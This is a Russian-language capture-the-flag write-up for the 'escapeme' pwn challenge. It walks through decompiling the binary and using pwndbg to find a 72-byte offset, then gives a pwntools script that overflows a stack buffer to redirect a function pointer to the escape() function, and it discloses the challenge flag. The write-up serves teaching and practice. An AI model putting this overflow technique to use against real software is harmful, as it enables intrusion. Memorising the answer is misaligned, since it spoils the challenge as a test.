# escapeme

## Описание
> Вы проснулись в темном и зыбком лабиринте, окруженном таинственными стенами, которые словно двигаются и меняют форму. Вглядываясь вокруг, вы видите огромное ASCII изображение монстра, его глаза сверкают зловещим светом, а улыбка кажется готовой раздавить вашу последнюю надежду.
>
> "Сбежать отсюда!" - гласит загадочное послание, возникающее перед вами. "Но путь к свободе лежит сквозь темные и запутанные закоулки этого лабиринта."
>
> Сердце начинает биться быстрее, и вы понимаете, что ваше единственное спасение - это проникнуть в секретную комнату, которая находится за огромным монстром.

Автор: [elicot](https://github.com/CornaElicottero)

nc localhost 2370

## Анализ файла
Проанализируем файл при помощи [онлайн декомпилятора](https://dogbolt.org/)

GHIDRA:
```c
#include "out.h"

int _init(EVP_PKEY_CTX *ctx)

{
  int iVar1;
  
  iVar1 = __gmon_start__();
  return iVar1;
}

void FUN_00401020(void)

{
                    // WARNING: Treating indirect jump as call
  (*(code *)(undefined *)0x0)();
  return;
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

int puts(char *__s)

{
  int iVar1;
  
  iVar1 = puts(__s);
  return iVar1;
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

int fflush(FILE *__stream)

{
  int iVar1;
  
  iVar1 = fflush(__stream);
  return iVar1;
}

void __isoc99_scanf(void)

{
  __isoc99_scanf();
  return;
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

void exit(int __status)

{
                    // WARNING: Subroutine does not return
  exit(__status);
}

// WARNING: Unknown calling convention -- yet parameter storage is locked

size_t fwrite(void *__ptr,size_t __size,size_t __n,FILE *__s)

{
  size_t sVar1;
  
  sVar1 = fwrite(__ptr,__size,__n,__s);
  return sVar1;
}

void processEntry _start(undefined8 param_1,undefined8 param_2)

{
  undefined auStack_8 [8];
  
  __libc_start_main(main,param_2,&stack0x00000008,__libc_csu_init,__libc_csu_fini,param_1,auStack_8)
  ;
  do {
                    // WARNING: Do nothing block with infinite loop
  } while( true );
}

void _dl_relocate_static_pie(void)

{
  return;
}

// WARNING: Removing unreachable block (ram,0x004010cd)
// WARNING: Removing unreachable block (ram,0x004010d7)

void deregister_tm_clones(void)

{
  return;
}

// WARNING: Removing unreachable block (ram,0x0040110f)
// WARNING: Removing unreachable block (ram,0x00401119)

void register_tm_clones(void)

{
  return;
}

void __do_global_dtors_aux(void)

{
  if (completed_0 == '\0') {
    deregister_tm_clones();
    completed_0 = 1;
    return;
  }
  return;
}

// WARNING: Removing unreachable block (ram,0x0040110f)
// WARNING: Removing unreachable block (ram,0x00401119)

void frame_dummy(void)

{
  return;
}

void printArt(void)

{
  puts(&DAT_00402008);
  return;
}

void main(void)

{
  undefined local_58 [72];
  code *local_10;
  
  local_10 = (code *)0x0;
  printArt();
  puts("[Nex\'zaltar] Only the one who can give me the secret word can survive.");
  fflush(stdout);
  fwrite("             Enter the secret word: ",1,0x24,stdout);
  fflush(stdout);
  __isoc99_scanf(&DAT_00402fe5,local_58);
  if (local_10 == (code *)0x0) {
    puts("[Nex\'zaltar] MUAAHAHAHA, YOU GOT ME THE WRONG SECRET WORD. NOW YOU WILL DIE.");
  }
  else {
    puts("[Nex\'zaltar] Did you think it would be so easy?");
    fflush(stdout);
    (*local_10)();
  }
                    // WARNING: Subroutine does not return
  exit(0);
}

void escape(void)

{
  puts("[Nex\'zaltar] You... You defeat me...");
  puts("surctf_find_flag_on_the_server");
                    // WARNING: Subroutine does not return
  exit(0);
}

void __libc_csu_init(EVP_PKEY_CTX *param_1,undefined8 param_2,undefined8 param_3)

{
  long lVar1;
  
  _init(param_1);
  lVar1 = 0;
  do {
    (*(code *)(&__frame_dummy_init_array_entry)[lVar1])((ulong)param_1 & 0xffffffff,param_2,param_3)
    ;
    lVar1 = lVar1 + 1;
  } while (lVar1 != 1);
  return;
}

void __libc_csu_fini(void)

{
  return;
}

void _fini(void)

{
  return;
}
```

Здесь мы можем заметить две функции, которые нас интересуют `main` и `escape`, где как раз находится команда `puts`, которая выводит в консоль флаг. Наша задача состоит в том, чтобы переполнить буфер и попасть в функцию escape на сервере, которая выведет нам флаг в консоль.

Но как нам это сделать? Мы можем заметить что `local_10` находится сразу после `local_58`. Это позволит нам переполнить переменную `local_58`, и записать в переменную `local_10` адрес функции `escape`, чтобы потом ее вызвать. Для этого нам надо узнать адрес функции escape, и размер буффера у переменной `local_58`.

Воспользуемся плагином для gdb - [pwndbg](https://github.com/pwndbg/pwndbg), который наиболее удобен для анализа скомпилированных файлов и предоставляет больше информации.

Запустим плагин:

```
$gdb ./escapeme
```

Теперь запустим наш скомпилированный файл:

```bash
pwndbg> start
Temporary breakpoint 1 at 0x401179

Temporary breakpoint 1, 0x0000000000401179 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
*RAX  0x401175 (main) ◂— push rbp
 RBX  0x0
*RCX  0x7ffff7fa3718 (__exit_funcs) —▸ 0x7ffff7fa4e20 (initial) ◂— 0x0
*RDX  0x7fffffffe018 —▸ 0x7fffffffe368 ◂— 'SHELL=/bin/bash'
*RDI  0x1
*RSI  0x7fffffffe008 —▸ 0x7fffffffe334 ◂— '/home/elicot/Downloads/surctf/pwn/escapeme/escapeme'
 R8   0x0
*R9   0x7ffff7fe21b0 (_dl_fini) ◂— push rbp
*R10  0x7
*R11  0x2
*R12  0x401080 (_start) ◂— xor ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
*RBP  0x7fffffffdf10 —▸ 0x401260 (__libc_csu_init) ◂— push r15
*RSP  0x7fffffffdf10 —▸ 0x401260 (__libc_csu_init) ◂— push r15
*RIP  0x401179 (main+4) ◂— sub rsp, 0x50
─────────────[ DISASM / x86-64 / set emulate on ]─────────────
 ► 0x401179 <main+4>     sub    rsp, 0x50
   0x40117d <main+8>     mov    qword ptr [rbp - 8], 0
   0x401185 <main+16>    call   printArt                      <printArt>
 
   0x40118a <main+21>    lea    rdi, [rip + 0x1de7]
   0x401191 <main+28>    call   puts@plt                      <puts@plt>
 
   0x401196 <main+33>    mov    rax, qword ptr [rip + 0x3eb3] <stdout@GLIBC_2.2.5>
   0x40119d <main+40>    mov    rdi, rax
   0x4011a0 <main+43>    call   fflush@plt                      <fflush@plt>
 
   0x4011a5 <main+48>    mov    rax, qword ptr [rip + 0x3ea4] <stdout@GLIBC_2.2.5>
   0x4011ac <main+55>    mov    rcx, rax
   0x4011af <main+58>    mov    edx, 0x24
────────────────────────[ STACK ]────────────────────────
00:0000│ rbp rsp 0x7fffffffdf10 —▸ 0x401260 (__libc_csu_init) ◂— push r15
01:0008│         0x7fffffffdf18 —▸ 0x7ffff7df8d0a (__libc_start_main+234) ◂— mov edi, eax
02:0010│         0x7fffffffdf20 —▸ 0x7fffffffe008 —▸ 0x7fffffffe334 ◂— '/home/elicot/Downloads/surctf/pwn/escapeme/escapeme'
03:0018│         0x7fffffffdf28 ◂— 0x100000000
04:0020│         0x7fffffffdf30 —▸ 0x401175 (main) ◂— push rbp
05:0028│         0x7fffffffdf38 —▸ 0x7ffff7df87cf (init_cacheinfo+287) ◂— mov rbp, rax
06:0030│         0x7fffffffdf40 ◂— 0x0
07:0038│         0x7fffffffdf48 ◂— 0x639eb28b251ec502
──────────────────────[ BACKTRACE ]───────────────────────
 ► 0         0x401179 main+4
   1   0x7ffff7df8d0a __libc_start_main+234
──────────────────────────────────────────────────────────

```

Попробуем узнать offset(размер буффера), при котором происходит ошибка Segmentation fault. Сделаем это при помощи команды cyclic, которая сгенерирует нам строку из определенного количества символов(в нашем случае мы попробуем напримере 100 символов):

```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> r
Starting program: /home/elicot/Downloads/surctf/pwn/escapeme/escapeme 
                ▄                                            ▄
              ,██                                           ▐██
              ██╢█                                          █▓██
             ▐██▓╢█▄            ▄▄▄▄██▄▄█▄▄▄▄,            ▄█▓▓██
              ███▓▓╢█▄,    ,▄████▓╢╣▓▀▀▓▓▓╢╢▓████▄     ,▄█╢▓▓███
              ▀██▓▓▓▓▓╢██▄██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▄██╢▓▓▓▓███▌
               ▀███▓▓▓▓▓▓▓▓╢╢▓▀▓█▓▓▓▓▓▓▓▓▓▓▓▓█▓▀▓╢╣▓▓▓▓▓▓▓▓███▀
                ▀████▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓▓▓█╣▓▓▓▓▓▓▓▓▓▓█████-
            ╒▄    ▀███████▓▓▓▓▓╢█╣▓▓▓▓▓▓▓▓▓▓▓█╢▓███████████▀    ▄
            ▐█▄      ███████████╢▓▓▓▓▓▓▓▓▓▓▓▓╢███████████      ▄█▌
            ▐█▓█    j█▓╢╢██▓╢╢▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╢╢███╢╢▓█    ,█▓█
             █▌▓██▄ ▐▓▓▓█████╢▓▓████▓▓▓▓▓▓████▓▓╢█████▓▓▓  ▄██▓█▌
              █▓██▓█▄▓▓███▓▓▓▓▓▓▓▓▓╢██████╢▓▓▓▓▓▓▓▓▓███▓▓▄█▓████
               █▓███▓█▓▓▓████▓▓▓▓▓▓▓ ▓██▓¬▓▓▓▓▓▓█████▓▓▓█▓███▓▀
                ███▓█▓▓▓▓▓▓▓████▓▓▓▓▓▓██▓▓▓▓▓▓████▓▓▓▓▓▓▓█▓█▓█
                ▐▓█▓█▓▓▓▓▓██████████████████████████▓▓▓▓▓█▓█▓
                 ██▓█╣▓▓▓█▌  ████▀████▓▓████▀████  ▐█▓▓▓▓█╢██
                 ██▓█▓▓▓▓▓██▄████ ▐███▓▓███▄ ████▄█▓▓▓▓▓██▓██
                  ▀█▌▓▓▓▓▓▓▓╢╢█████▓██▓▓██▓█████╢╢▓▓▓▓▓▓▓██▀
                   `█▓▓▓▓▓▓▓██████████▓▓██████████╢▓▓▓▓▓▓█
                    `█▓▓▓▓█▓▓▓▓██╢╢▓██▓▓██╢╢╢██╣▓▓▓█▓▓▓▓█
                      ▀█▓▓▓▓▓█╣╢▓▓████▓▓███╢▓▓╢██▓▓▓▓▓█▀
                       █▓▓▓▓█████▓▓▓██╣▓██▓╢▓█████▓▓▓▓█
                       ▐█▓▓▓▓╣█▄ ▌▀▀▀▀██▀█▀▀▌ ,█╫▓▓▓▓█▌
                        ██▓▓▓▓▓█▌▐       ▐ .═▐█╣▓▓▓▓██
                         ██▓▓▓▓▓█▄  ▌ ▐` [ j▄█╣▓▓▓▓█▀
                          ▀█▓▓▓▓╢██▄L ¬  [▄██╢▓▓▓██`
                            ▀█▓▓▓▓╢███▄▄███╢▓▓▓▓█▀
                              █▓▓▓▓▓▓╣╣╢▓▓▓▓▓▓▓▌
                               █▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
                                ██▓▓▓▓▓▓▓▓▓▓██
                                 `▀▀▀▀``▀▀▀▀
[Nex'zaltar] Only the one who can give me the secret word can survive.
             Enter the secret word: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[Nex'zaltar] Did you think it would be so easy?

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401220 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────
*RAX  0x616161616161616a ('jaaaaaaa')
 RBX  0x0
*RCX  0xc00
*RDX  0x0
*RDI  0x7ffff7fa5990 (_IO_stdfile_1_lock) ◂— 0x0
*RSI  0x0
 R8   0x0
*R9   0xffffffffffffff80
*R10  0x7ffff7f523c0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002
*R11  0x246
 R12  0x401080 (_start) ◂— xor ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdf10 ◂— 'kaaaaaaalaaaaaaamaaa'
*RSP  0x7fffffffdec0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x401220 (main+171) ◂— call rax
────────────[ DISASM / x86-64 / set emulate on ]────────────
 ► 0x401220 <main+171>     call   rax                           <0x616161616161616a>
 
   0x401222 <main+173>     mov    edi, 0
   0x401227 <main+178>     call   exit@plt                      <exit@plt>
 
   0x40122c <escape>       push   rbp
   0x40122d <escape+1>     mov    rbp, rsp
   0x401230 <escape+4>     lea    rdi, [rip + 0x1e31]
   0x401237 <escape+11>    call   puts@plt                      <puts@plt>
 
   0x40123c <escape+16>    lea    rdi, [rip + 0x1e4d]
   0x401243 <escape+23>    call   puts@plt                      <puts@plt>
 
   0x401248 <escape+28>    mov    edi, 0
   0x40124d <escape+33>    call   exit@plt                      <exit@plt>
───────────────────────────────[ STACK ]────────────────────────────────
00:0000│ rsp 0x7fffffffdec0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffdec8 ◂— 'baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffded0 ◂— 'caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
03:0018│     0x7fffffffded8 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
04:0020│     0x7fffffffdee0 ◂— 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
05:0028│     0x7fffffffdee8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
06:0030│     0x7fffffffdef0 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
07:0038│     0x7fffffffdef8 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
────────────────────────────────[ BACKTRACE ]────────────────────────────────
 ► 0         0x401220 main+171
   1 0x616161616161616c
   2   0x7f006161616d
   3      0x100000000
   4         0x401175 main
   5   0x7ffff7df87cf init_cacheinfo+287
   6              0x0
─────────────────────────────────────────────────────────────────────────────
```

Здесь мы можем заметить что наш ввод как раз и вызвал нам нужную ошибку Segmentation fault. Теперь мы можем узнать offset при котором произошло переполнение и программа вылетела с ошибкой. Проанализируем первую строку после ввода:

```bash
──────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────
*RAX  0x616161616161616a ('jaaaaaaa')
```

Введем команду `cyclic -l`, чтобы узнать offset:

```bash
pwndbg> cyclic -l jaaaaaaa
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
```

Видим надпись `Found at offset 72`, что означает что размер буффера составляет 72 байта. Значит если мы напишем символов больше чем 72, то оставшиеся и будут записываться дальше в ячейки памяти, соответственно в следующую переменную (у нас это `local_10`). Осталось узнать сам адрес функции `escape` куда нам нужно попасть.

Пропишем команду `info functions`:

```bash
pwndbg> info functions
All defined functions:
Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  fflush@plt
0x0000000000401050  __isoc99_scanf@plt
0x0000000000401060  exit@plt
0x0000000000401070  fwrite@plt
0x0000000000401080  _start
0x00000000004010b0  _dl_relocate_static_pie
0x00000000004010c0  deregister_tm_clones
0x00000000004010f0  register_tm_clones
0x0000000000401130  __do_global_dtors_aux
0x0000000000401160  frame_dummy
0x0000000000401162  printArt
0x0000000000401175  main
0x000000000040122c  escape
0x0000000000401260  __libc_csu_init
0x00000000004012c0  __libc_csu_fini
0x00000000004012c4  _fini

```

Здесь мы видим адресы ячеек памяти всех функций в данной программе. Раскомпилим функцию `escape` и узнаем точку входа:

```bash
pwndbg> disassemble escape
Dump of assembler code for function escape:
   0x000000000040122c <+0>:	push   rbp
   0x000000000040122d <+1>:	mov    rbp,rsp
   0x0000000000401230 <+4>:	lea    rdi,[rip+0x1e31]        # 0x403068
   0x0000000000401237 <+11>:	call   0x401030 <puts@plt>
   0x000000000040123c <+16>:	lea    rdi,[rip+0x1e4d]        # 0x403090
   0x0000000000401243 <+23>:	call   0x401030 <puts@plt>
   0x0000000000401248 <+28>:	mov    edi,0x0
   0x000000000040124d <+33>:	call   0x401060 <exit@plt>
End of assembler dump.
```

Самый первый адрес и является точкой входа в данную функцию. Теперь осталось написать скрипт для переполнения буффера и перехода на нужную нам функцию. Будем использовать библиотеку [pwntools](https://github.com/Gallopsled/pwntools) для Python.

Вот сам скрипт:
```py
from pwn import *

io = process('./escapeme')
# io = remote('localhost', 2370)
io.recvuntil(b'Enter the secret word: ')
io.sendline(b'A'*72 + p64(0x40122c))
print(io.interactive())
```

Здесь мы подключаемся сначала к файлу, чтобы проверить локально сможем ли мы получить флаг. `io.recvuntil(b'Enter the secret word: ')` означает, что мы будем читать все что выводится консоль до момента когда нам предложат ввести значение. `io.sendline(b'A'*72 + p64(0x40122c))` - эта строка как раз и является нашим payload. Здесь мы переполняем буфер 72 буквами "А" и после этого записываем в 64 битовую запись адрес точки входа в функцию `escape`. Запустим и проверим:

```bash
$python3 exploit.py 
[+] Starting local process './escapemetask': pid 279738
[*] Switching to interactive mode
[*] Process './escapemetask' stopped with exit code 0 (pid 279738)
[Nex'zaltar] Did you think it would be so easy?
[Nex'zaltar] You... You defeat me...
surctf_find_flag_on_the_server
[*] Got EOF while reading in interactive
```

Все хорошо, флаг выводится, теперь проверим на сервере (закомментим строку файлом и раскомментим строку с подключением по nc):

```bash
$python3 exploit.py 
[+] Opening connection to localhost on port 2370: Done
[*] Switching to interactive mode
[Nex'zaltar] Did you think it would be so easy?
[Nex'zaltar] You... You defeat me...
surctf_N3xz4ltar_Escap3_4c3ss_grant3d
[*] Got EOF while reading in interactive
```

Отлично, флаг получен.

`flag: surctf_N3xz4ltar_Escap3_4c3ss_grant3d`
